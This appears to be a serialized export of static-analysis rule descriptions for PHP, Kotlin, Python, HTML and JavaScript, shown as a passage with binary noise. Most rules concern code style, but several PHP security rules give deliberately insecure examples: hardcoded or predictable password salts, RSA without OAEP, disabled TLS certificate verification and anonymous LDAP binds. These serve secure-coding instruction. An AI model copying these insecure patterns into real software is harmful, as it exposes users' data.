  <li> provide the salt to a safe hashing function such as PBKDF2. </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function createMyAccount() {
  $email = $_GET['email'];
  $name = $_GET['name'];
  $password = $_GET['password'];

  $hash = hash_pbkdf2('sha256', $password, $email, 100000); // Noncompliant; salt (3rd argument) is predictable because initialized with the provided $email

  $hash = hash_pbkdf2('sha256', $password, '', 100000); // Noncompliant; salt is empty

  $hash = hash_pbkdf2('sha256', $password, 'D8VxSmTZt2E2YV454mkqAY5e', 100000); // Noncompliant; salt is hardcoded

  $hash = crypt($password); // Noncompliant; salt is not provided
  $hash = crypt($password, ""); // Noncompliant; salt is hardcoded

  $options = [
    'cost' =&gt; 11,
    'salt' =&gt; mcrypt_create_iv(22, MCRYPT_DEV_URANDOM), // Noncompliant ; use salt generated by default
  ];
  echo password_hash("rasmuslerdorf", PASSWORD_BCRYPT, $options);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$salt = openssl_random_pseudo_bytes(16);
$hash = hash_pbkdf2("sha256", $password, $salt, $iterations, 20);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/759.html">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/760.html">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
√
	php:S1067µ
phpS1067%Expressions should not be too complex"CRITICAL*php:‰<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
if ((($condition1 &amp;&amp; $condition2) || ($condition3 &amp;&amp; $condition4)) &amp;&amp; $condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (my_first_condition() || my_second_condition()) &amp;&amp; my_last_condition()) { ... }
</pre>Z
CODE_SMELL
‹
	php:S2277Œ
phpS2277cCryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)"CRITICAL*php:º<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an
issue when <code>openssl_public_encrypt</code> is used with one the following padding constants: <code>OPENSSL_NO_PADDING</code> or
<code>OPENSSL_PKCS1_PADDING</code> or <code>OPENSSL_SSLV23_PADDING</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function encrypt($data, $key) {
  $crypted='';
  openssl_public_encrypt($data, $crypted, $key, OPENSSL_NO_PADDING); // Noncompliant
  return $crypted;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function encrypt($data, $key) {
  $crypted='';
  openssl_public_encrypt($data, $crypted, $key, OPENSSL_PKCS1_OAEP_PADDING);
  return $crypted;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/780.html">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING">RSA NoPadding Unsafe</a> </li>
</ul>ZVULNERABILITY
Ï
	php:S1311ﬁ
phpS1311!Classes should not be too complex"CRITICAL*php:ë<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
ç
	php:S3972ˇ
phpS3972&Conditionals should start on new lines"CRITICAL*php:≠<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding
<code>else</code> or <code>elseif</code>, it is either an error - <code>else</code> is missing - or the invitation to a future error as maintainers
fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($condition1) {
  // ...
} if ($condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($condition1) {
  // ...
} elseif ($condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if ($condition1) {
  // ...
}

if ($condition2) {
  //...
}
</pre>Z
CODE_SMELL
÷
	php:S2004»
phpS2004)Functions should not be nested too deeply"CRITICAL*php:Û<p>Nesting functions can quickly turn your code into "spaghetti code". Such code is hard to read, refactor and therefore to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function f () {
  function f_inner () {
    function f_inner_inner() {
      function f_inner_inner_inner() { // Noncompliant
      }
    }
  }
}
</pre>Z
CODE_SMELL
Ÿ
	php:S3973À
phpS3973EA conditionally executed single line should be denoted by indentation"CRITICAL*php:⁄<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($x &gt; 0)  // Noncompliant
doTheThing();
doTheOtherThing();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($x &gt; 0) {
  doTheThing();
  doTheOtherThing();
}

foo();
</pre>
<p>or</p>
<pre>
if ($x &gt; 0)
    doTheThing();
doTheOtherThing();

foo();
</pre>Z
CODE_SMELL
’

	php:S3332«

phpS33323Session-management cookies should not be persistent"CRITICAL*php:Â	<p>Cookies without fixed lifetimes or expiration dates are known as non-persistent, or "session" cookies, meaning they last only as long as the
browser session, and poof away when the browser closes. Cookies with expiration dates, "persistent" cookies, are stored/persisted until those
dates.</p>
<p>Non-persistent cookies should be used for the management of logged-in sessions on web sites. To make a cookie non-persistent, simply omit the
<code>expires</code> attribute.</p>
<p>This rule raises an issue when <code>expires</code> is set for a session cookie, either programmatically or via configuration, such as
<code>session.cookie_lifetime</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting
  (XSS) </li>
  <li> <a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Expire_and_Max-Age_Attributes">OWASP, Session Management Cheat
  Sheet</a> - Expire and Max-Age Attributes </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_PERSISTENT">COOKIE_PERSISTENT</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZVULNERABILITY
Ä	
php:S131Û
phpS1311"switch" statements should have "default" clauses"CRITICAL*php:ó<p>The requirement for a final <code>case default</code> clause is defensive programming. The clause should either take appropriate action, or contain
a suitable comment as to why no action is taken. Even when the <code>switch</code> covers all current values of an <code>enum</code>, a default case
should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($param) {  //missing default clause
  case 0:
    do_something();
    break;
  case 1:
    do_something_else();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($param) {
  case 0:
    do_something();
    break;
  case 1:
    do_something_else();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
›
php:S134–
phpS134`Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply"CRITICAL*php:≈<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
  if (condition1) {                  // Compliant - depth = 1
    ...
    if (condition2) {                // Compliant - depth = 2
      ...
      for($ = 0; $i &lt; 10; $i++) {  // Compliant - depth = 3, not exceeding the limit
        ...
        if (condition4) {            // Non-Compliant - depth = 4
          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            ...
          }
          return;
        }
      }
    }
  }
</pre>Z
CODE_SMELL
¨
php:S126ü
phpS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*php:∫<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  do_something();
} else if (condition2) {
  do_something_else();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  do_something();
} else if (condition2) {
  do_something_else();
} else {
  throw new InvalidArgumentException('message');
}
</pre>
<h2>Exceptions</h2>
<p>When all branches of an <code>if</code>-<code>else if</code> end with <code>return</code>, <code>break</code> or <code>throw</code>, the code that
comes after the <code>if</code> implicitly behaves as if it was in an <code>else</code> clause. This rule will therefore ignore that case.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
∞
	php:S4830¢
phpS4830AServer certificates should be verified during SSL/TLS connections"CRITICAL*php:≤<p>Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to man-in-the-middle attacks. </p>
<p>The certificate chain validation includes these steps:</p>
<ul>
  <li> The certificate is issued by its parent Certificate Authority or the root CA trusted by the system. </li>
  <li> Each CA is allowed to issue certificates. </li>
  <li> Each certificate in the chain is not expired. </li>
</ul>
<p>It's not recommended to reinvent the wheel by implementing custom certificate chain validation.</p>
<p>TLS libraries provide built-in certificate validation functions that should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); // Noncompliant
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, TRUE); // Compliant; default value is TRUE
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 1);  // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
</ul>ZVULNERABILITY
÷
	php:S2011»
phpS2011"global" should not be used"CRITICAL*php:Å<p>Global variables are a useful construct, but they should not be abused. Functions can access the global scope either through the
<code>global</code> keyword or though the <code>$GLOBALS</code> array, but these practices considerably reduce the function's readability and
reusability. Instead, the global variable should be passed as a parameter to the function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$myGlobalVariable;

function foo()
{
  global $myGlobalVariable; // Noncompliant
  $GLOBALS['myGlobalVariable']; // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo($myStateVariable)
{
  // ...
}
</pre>Z
CODE_SMELL
Í

	php:S4433‹

phpS4433(LDAP connections should be authenticated"CRITICAL*php:Ö
<p>An un-authenticated LDAP connection can lead to transactions without access control. Authentication, and with it, access control, are the last line
of defense against LDAP injections and should not be disabled.</p>
<p>This rule raises an issue when an anonymous LDAP connection is created.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$ldapconn = ldap_connect("ldap.example.com");

if ($ldapconn) {
    $ldapbind = ldap_bind($ldapconn); // Noncompliant; anonymous authentication, no user/password provided
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$ldaprdn  = 'uname';
$ldappass = 'password';

$ldapconn = ldap_connect("ldap.example.com");

if ($ldapconn) {
    $ldapbind = ldap_bind($ldapconn, $ldaprdn, $ldappass); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">CWE-521</a> - Weak Password Requirements </li>
  <li> <a href="https://docs.oracle.com/javase/tutorial/jndi/ldap/authentication.html">Modes of Authenticating to LDAP</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ANONYMOUS">LDAP_ANONYMOUS</a> </li>
</ul>ZVULNERABILITY
Æ
kotlin:S3776ù
kotlinS37768Cognitive Complexity of functions should not be too high"CRITICAL*kotlin:≥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
ö
kotlin:S134ä
kotlinS134^Control flow statements "if", "for", "while", "when" and "try" should not be nested too deeply"CRITICAL*kotlin:˚<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>when</code>, and <code>try</code> statements are key ingredients for making
what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>Z
CODE_SMELL
ÿ	
kotlin:S1192«	
kotlinS1192(String literals should not be duplicated"CRITICAL*kotlin:Ì<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
class A {
    fun run() {
        prepare("string literal")    // Noncompliant - "string literal" is duplicated 3 times
        execute("string literal")
        release("string literal")
    }

    fun method() {
        println("'")                 // Compliant - literal "'" has less than 5 characters and is excluded
        println("'")
        println("'")
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
    companion object {
        const val CONSTANT = "string literal"
    }

    fun run() {
        prepare(CONSTANT)    // Compliant
        execute(CONSTANT)
        release(CONSTANT)
    }
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having 5 or less characters are excluded as well as literals containing only letters, digits
and '_'.</p>Z
CODE_SMELL
¯	
kotlin:S126Ë	
kotlinS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*kotlin:˝<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
¡
kotlin:S1067∞
kotlinS1067%Expressions should not be too complex"CRITICAL*kotlin:Ÿ<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>Z
CODE_SMELL
ù
kotlin:S1186å
kotlinS1186Functions should not be empty"CRITICAL*kotlin:Ω<p>There are several reasons for a function not to have a function body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The function is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>Z
CODE_SMELL
Ã
kotlin:S1821ª
kotlinS1821&"when" statements should not be nested"CRITICAL*kotlin:„<p>Nested <code>when</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>when</code> as belonging
to an outer statement. Therefore nested <code>when</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>when</code> statements, but if you cannot, then consider moving the
inner <code>when</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
fun foo(n: Int, m: Int) {
  when (n) {
    0 -&gt;
      when (m) {  // Noncompliant; nested when
        // ...
      }
    1 -&gt; print("1")
    else -&gt; print("2")
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
fun foo(n: Int, m: Int) {
  when (n) {
    0 -&gt; bar(m)
    1 -&gt; print("1")
    else -&gt; print("2")
  }
}

fun bar(m: Int){
  when(m) {
    // ...
  }
}
</pre>Z
CODE_SMELL
ì
python:S1186Ç
pythonS1186)Functions and methods should not be empty"CRITICAL*py:´<p>There are several reasons for a function or a method not to have a body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
def myfunc1(foo="Noncompliant"):
    pass

class MyClass:
    def mymethod1(self, foo="Noncompliant"):
        pass

</pre>
<h2>Compliant Solution</h2>
<pre>
def myfunc1():
    pass  # comment explaining why this function is empty

def myfunc2():
    raise NotImplementedError()

def myfunc3():
    """
    Docstring explaining why this function is empty.
    """

class MyClass:
    def mymethod1(self):
        pass  # comment explaining why this function is empty

    def mymethod2(self):
        raise NotImplementedError()

    def mymethod3(self):
        """
        Docstring explaining why this method is empty. Note that this is not recommended for classes
        which are meant to be subclassed.
        """
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised when the empty method is abstract and meant to be overriden in a subclass, i.e. it is decorated with
<code>abc.abstractmethod</code>, <code>abc.abstractstaticmethod</code>, <code>abc.abstractclassmethod</code> or <code>abc.abstractproperty</code>.
Note however that these methods should normally have a docstring explaining how subclasses should implement these methods.</p>
<pre>
import abc

class MyAbstractClass(abc.ABC):
    @abc.abstractproperty
    def myproperty(self):
        pass

    @abc.abstractclassmethod
    def myclassmethod(cls):
        pass

    @abc.abstractmethod
    def mymethod(self):
        pass

    @abc.abstractstaticmethod
    def mystaticmethod():
        pass
</pre>Z
CODE_SMELL
Ö
python:ClassComplexityÍ
pythonClassComplexity!Classes should not be too complex"CRITICAL*py:ë<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
´
python:S3776ö
pythonS37768Cognitive Complexity of functions should not be too high"CRITICAL*py:¥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
û
python:S134é
pythonS134^Control flow statements "if", "for", "while", "try" and "with" should not be nested too deeply"CRITICAL*py:É<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>try</code>, and <code>with</code> statements are key ingredients for making
what's known as "Spaghetti code". Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>The following code snippet illustrates this rule with the default threshold of 3.</p>
<pre>
  if condition1:           # Compliant - depth = 1
    # ...
    if condition2:         # Compliant - depth = 2
      # ...
      for i in range(10):  # Compliant - depth = 3, not exceeding the limit
        # ...
        if condition4:     # Non-Compliant - depth = 4
          if condition5:   # Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            # ...
</pre>Z
CODE_SMELL
˝
python:S1716Ï
pythonS17168"break" and "continue" should not be used outside a loop"CRITICAL*py:ç<p><code>break</code> and <code>continue</code> are unstructured control flow statements which make code harder to read. Additionally, more recent
versions of Python raise a SyntaxError when modules containing <code>break</code> or <code>continue</code> outside of a loop are imported.</p>
<p>Therefore, these statements should not be used outside of loops. </p>
<h2>Noncompliant Code Example</h2>
<pre>
narg=len(sys.argv)
if narg == 1:
        print('@Usage: input_filename nelements nintervals')
        break
</pre>
<h2>Compliant Solution</h2>
<pre>
if narg == 1:
        print('@Usage: input_filename nelements nintervals')
        sys.exit()
</pre>ZBUG
ô
python:FunctionComplexity˚
pythonFunctionComplexity#Functions should not be too complex"CRITICAL*py:ù<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>Z
CODE_SMELL
ï	
python:S1192Ñ	
pythonS1192(String literals should not be duplicated"CRITICAL*py:Æ<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
def run():
    prepare("this is a duplicate")  # Noncompliant - "this is a duplicate" is duplicated 3 times
    execute("this is a duplicate")
    release("this is a duplicate")
</pre>
<h2>Compliant Solution</h2>
<pre>
ACTION_1 = "action1"

def run():
    prepare(ACTION_1)
    execute(ACTION_1)
    release(ACTION_1)
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised on:</p>
<ul>
  <li> duplicated string in decorators </li>
  <li> strings with less than 5 characters </li>
  <li> strings with only letters, numbers and underscores </li>
</ul>
<pre>
@app.route("/api/users/", methods=['GET', 'POST', 'PUT'])
def users():
    pass

@app.route("/api/projects/", methods=['GET', 'POST', 'PUT'])  # Compliant
def projects():
    pass
</pre>Z
CODE_SMELL
Ñ
	Web:S5258ˆ
WebS52589Tables used for layout should not include semantic markup"CRITICAL*web:ò<p>Tables used for layout should not include semantic markup, such as <code>&lt;th&gt;</code> elements, as it can confuses assistive technologies. At
best this information will be ignored by screen readers and makes the code less maintainable. However it can also confuse some screen readers and
reduce the web page accessibility.</p>
<p>This rule raises an issue when a <code>&lt;table&gt;</code> element containing the&nbsp;<code>role</code> attribute set to
<code>"presentation"</code> or <code>"none"</code> also contains any of:</p>
<ul>
  <li> a <code>&lt;caption&gt;</code> element </li>
  <li> a <code>&lt;th&gt;</code> element </li>
  <li> a non-empty <code>summary</code> attribute </li>
  <li> an <code>&lt;td&gt;</code> element with a <code>headers</code> or <code>scope</code> attribute </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;table role="presentation" summary="bla"&gt; &lt;!-- Noncompliant --&gt;
  &lt;caption&gt;People&lt;/caption&gt; &lt;!-- Noncompliant --&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;/td&gt;
    &lt;th&gt;Name&lt;/th&gt; &lt;!-- Noncompliant --&gt;
    &lt;th id="myid1"&gt;Age&lt;/th&gt; &lt;!-- Noncompliant --&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td scope="row"&gt;1&lt;/td&gt; &lt;!-- Noncompliant --&gt;
    &lt;td&gt;John Doe&lt;/td&gt;
    &lt;td&gt;24&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td id="myid2"&gt;2&lt;/td&gt;
    &lt;td headers="myid1 myid2"&gt;Alice Doe&lt;/td&gt; &lt;!-- Noncompliant --&gt;
    &lt;td&gt;54&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-content-structure-separation-programmatic">WCAG2, 1.3.1</a>&nbsp;-&nbsp;Info
  and Relationships </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/F46.html">WCAG2, F46</a> - Failure of Success Criterion 1.3.1 due to using th elements, caption
  elements, or non-empty summary attributes in layout tables </li>
</ul>ZBUG
·
	Web:S5260”
WebS5260*Table cells should reference their headers"CRITICAL*web:Ñ<p>If a <code>&lt;td&gt;</code> cell has a <code>headers</code> attribute, it should reference only IDs of headers in the same column and row.</p>
<p>Note that it is usually better to use <code>scope</code> attributes of <code>&lt;th&gt;</code> headers instead of <code>headers</code> attribute.
<code>headers</code> attribute requires you to list every corresponding <code>&lt;th&gt;</code> header's <code>id</code>, which is error-prone and
makes the code less maintainable. See&nbsp;<a href="https://www.w3.org/WAI/tutorials/tables/tips/">W3C WAI&nbsp;Web Accessibility
Tutorials</a>&nbsp;for more information.</p>
<p>If your table is too complex, it might be better to split it into multiple small tables as it improves both readability and maintainability.</p>
<p>This rule raises an issue when the <code>headers</code> attribute of a <code>&lt;td&gt;</code> cell contains IDs which don't belong to a header in
the same row or column.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;table border="1"&gt;
&lt;caption&gt;
    Rental price
&lt;/caption&gt;
&lt;thead&gt;
    &lt;tr&gt;
        &lt;td&gt;&lt;/td&gt;
        &lt;th id="small" scope="col"&gt;
            Small car
        &lt;/th&gt;
        &lt;th id="big" scope="col"&gt;
            Big Car
        &lt;/th&gt;
    &lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
    &lt;tr&gt;
        &lt;th id="paris" class="span" colspan="3" scope="colgroup"&gt;
            Paris
        &lt;/th&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
        &lt;th headers="paris" id="day1"&gt;
            1 day
        &lt;/th&gt;
        &lt;td headers="paris day1 big"&gt; &lt;!-- Noncompliant, referencing the column "big" instead of "small" --&gt;
            11 euros
        &lt;/td&gt;
        &lt;td headers="berlin day1 big"&gt; &lt;!-- Noncompliant, there is no header with id "berlin" --&gt;
            50 euros
        &lt;/td&gt;
        &lt;/tr&gt;
    &lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the <code>headers</code> attribute contains the following characters: {}()[]$. This avoids false positives on variables
coming from Javascript frameworks such as Angular.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-content-structure-separation-programmatic">WCAG2, 1.3.1</a>&nbsp;-&nbsp;Info
  and Relationships </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/html.html#H43">WCAG2, H43</a> - Using id and headers attributes to associate data cells with header
  cells in data tables </li>
</ul>ZBUG
ö
javascript:S4524Ö

javascriptS4524 "default" clauses should be last"CRITICAL*js:≥<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
first or the last one of the <code>switch</code>'s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  default: // default clause should be the first or last one
    error();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>Z
CODE_SMELL
–
javascript:ConditionalCommentÆ

javascriptConditionalComment;Internet Explorer's conditional comments should not be used"CRITICAL*js:¥<p>Internet Explorer offers a way to change the JavaScript code at runtime using conditional comments (activated by a @cc_on statement found in a
comment). Using this preprocessing feature decreases readability and maintainability, and can hinder automated tools. What's more, it is specific to
Internet Explorer and won't work for other browsers.</p>
<p>Most of the time, using those conditional comments can be easily avoided with some refactoring - using modern cross-browsers JavaScript frameworks
and libraries.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/*@cc_on
